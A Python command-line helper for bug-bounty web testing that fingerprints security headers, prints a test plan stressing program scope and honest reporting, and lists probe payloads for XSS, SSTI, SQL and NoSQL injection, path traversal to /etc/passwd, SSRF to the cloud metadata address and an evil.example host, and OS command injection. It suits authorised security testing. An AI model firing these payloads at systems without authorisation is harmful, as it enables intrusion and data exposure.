#!/usr/bin/env python3
"""Web/application pentest companion to the EVM stack.

Many crypto programs (Immunefi, HackenProof, Cantina, HackerOne, ...) also scope *web
applications and APIs*, not just smart contracts. `cs_web` brings the Wesley Thijs (The XSS Rat)
method to ChainScope:

    python cs_web.py fingerprint <url>     # fingerprint before you fire
    python cs_web.py plan                  # the systematic test plan (walk -> every field -> every class)
    python cs_web.py payloads              # the per-field payload set (register with an attack vector)

Mindset: fingerprint, don't scan; manually walk the app; drop an attack vector into every field;
do all the tests; test every privilege level; study what pays.
"""
from __future__ import annotations

import sys
from pathlib import Path

_PARENT = str(Path(__file__).resolve().parent.parent)
if _PARENT not in sys.path:
    sys.path.insert(0, _PARENT)


import urllib.error
import urllib.request

import typer

app = typer.Typer()

_SECURITY_HEADERS = [
    "content-security-policy",
    "strict-transport-security",
    "x-frame-options",
    "x-content-type-options",
    "referrer-policy",
    "permissions-policy",
    "cross-origin-opener-policy",
    "cross-origin-resource-policy",
]

_PAYLOADS: dict[str, list[str]] = {
    "reflected/stored XSS": [
        "<script>alert(1)</script>",
        "\"><img src=x onerror=alert(1)>",
        "javascript:alert(1)",
        "'-alert(1)-'",
    ],
    "HTML tag/attribute injection": [
        "\" autofocus onfocus=alert(1) x=\"",
        "'><svg/onload=alert(1)>",
    ],
    "SSTI": [
        "{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "{{7*'7'}}",
    ],
    "SQLi": [
        "' OR '1'='1", "1' AND SLEEP(5)-- -", "1) OR 1=1-- -", "\" OR \"1\"=\"1",
    ],
    "NoSQLi": [
        "' || '1'=='1", '{"$ne":null}', '{"$gt":""}', "';return true;var x='",
    ],
    "path traversal / LFI": [
        "../../../../etc/passwd", "..%2f..%2f..%2fetc%2fpasswd", "....//....//etc/passwd",
    ],
    "SSRF / open redirect": [
        "http://127.0.0.1/", "http://169.254.169.254/latest/meta-data/", "//evil.example",
    ],
    "OS command injection": [
        ";id", "|id", "$(id)", "`id`", "%0aid",
    ],
    "mass assignment / IDOR": [
        '{"role":"admin"}', '{"isAdmin":true}', '{"user_id":1}',
    ],
}

_PLAN = """\
WEB/APP TEST PLAN

0. Scope + setup (frictionless)
   - Read the program scope, rules, OOS, and the reward/severity table.
   - Configure a proxy (Burp/mitmproxy), scope filters, and save the project so starting is free.

1. Fingerprint before you fire
   - `cs_web.py fingerprint <url>`: server, tech, security headers, CSP.
   - Identify the stack (framework, versions, CMS, API style) BEFORE blasting.

2. Manually walk the application (recon)
   - Explore every feature as a normal user; map the app the way its developers see it.
   - Note every endpoint, parameter, cookie, header, and role/privilege level you can reach.
   - Create accounts at EVERY privilege level you can (user, org admin, admin, ...).

3. Drop an attack vector into every field
   - Register with payloads in every field (`cs_web.py payloads`); re-check where they reflect.
   - For each request, change every value: ids (IDOR), roles (mass assignment), amounts, paths.

4. Test every parameter against every class (do them all)
   - Broken access control / vertical IDOR / privilege escalation
   - Reflected + stored XSS, HTML/attribute injection, SSTI
   - SQLi / NoSQLi / XXE, OS command injection, LFI/RFI, path traversal
   - SSRF, open redirect, CSRF, race conditions (funds transfer), excessive data exposure
   - Authentication/session: JWT alg confusion, missing signature check, replay, nonce reuse

5. Study what pays
   - `cs_pays.py` for the classes currently landing; check the program's disclosed reports.

6. Report
   - Prove the end effect first, then pick the impact. No overclaiming. Working PoC required.
   - Follow the platform's rules (see IMMUNEFI_POLICY_NOTES.md / HACKENPROOF_POLICY_NOTES.md).

Kill-test: listed impact + defensible $ today; permissionless reach; intended-design check; PoC rule.
"""


def _fingerprint(url: str) -> None:
    if not url:
        typer.echo("cs_web: fingerprint needs a <url>", err=True)
        raise typer.Exit(1)
    req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
    try:
        with urllib.request.urlopen(req, timeout=20) as resp:
            status, headers = resp.status, {k.lower(): v for k, v in resp.headers.items()}
    except urllib.error.HTTPError as e:
        status, headers = e.code, {k.lower(): v for k, v in e.headers.items()}
    except Exception as exc:  # noqa: BLE001
        typer.echo(f"cs_web: request failed: {exc}", err=True)
        raise typer.Exit(1)

    typer.echo(f"status: {status}")
    typer.echo(f"server: {headers.get('server', '?')}")
    for h in ("x-powered-by", "x-generator", "via", "cf-ray", "x-aspnet-version"):
        if h in headers:
            typer.echo(f"{h}: {headers[h]}")
    typer.echo("")
    typer.echo("=== security headers ===")
    for h in _SECURITY_HEADERS:
        v = headers.get(h)
        typer.echo(f"  {'OK ' if v else 'MISSING'} {h}" + (f": {v[:100]}" if v else ""))
    typer.echo("")
    typer.echo("Next: walk the app as a user, enumerate every field/param, then run `cs_web.py plan`.")


def _payloads() -> None:
    for cls, pl in _PAYLOADS.items():
        typer.echo(f"### {cls}")
        for p in pl:
            typer.echo(f"    {p}")
        typer.echo("")


@app.command()
def web(
    action: str = typer.Argument("plan", help="fingerprint | plan | payloads"),
    url: str = typer.Argument("", help="URL (for fingerprint)"),
):
    """Web/application pentest helper: fingerprint | plan | payloads."""
    action = (action or "plan").lower()
    if action == "fingerprint":
        _fingerprint(url)
    elif action == "payloads":
        _payloads()
    else:
        typer.echo(_PLAN)


if __name__ == "__main__":
    app()
